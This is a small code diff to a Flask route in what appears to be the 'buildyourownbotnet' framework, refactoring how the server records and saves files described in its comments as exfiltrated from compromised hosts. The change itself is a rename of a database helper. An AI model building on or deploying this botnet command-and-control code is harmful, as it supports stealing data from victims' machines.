@@ -3,7 +3,8 @@ import base64
 import string
 import random
 from flask import Blueprint, request
-from buildyourownbotnet.core import dao, generators
+from buildyourownbotnet.core import generators
+from buildyourownbotnet.core.dao import file_dao
 
 
 # Blueprint
@@ -48,7 +49,7 @@ def file_add():
 	output_path = os.path.join(os.getcwd(), 'buildyourownbotnet/output', owner, 'files', filename)
 
 	# add exfiltrated file to database
-	dao.add_file(owner, filename, session, module)
+	file_dao.add_user_file(owner, filename, session, module)
 
 	# save exfiltrated file to user directory
 	with open(output_path, 'wb') as fp:
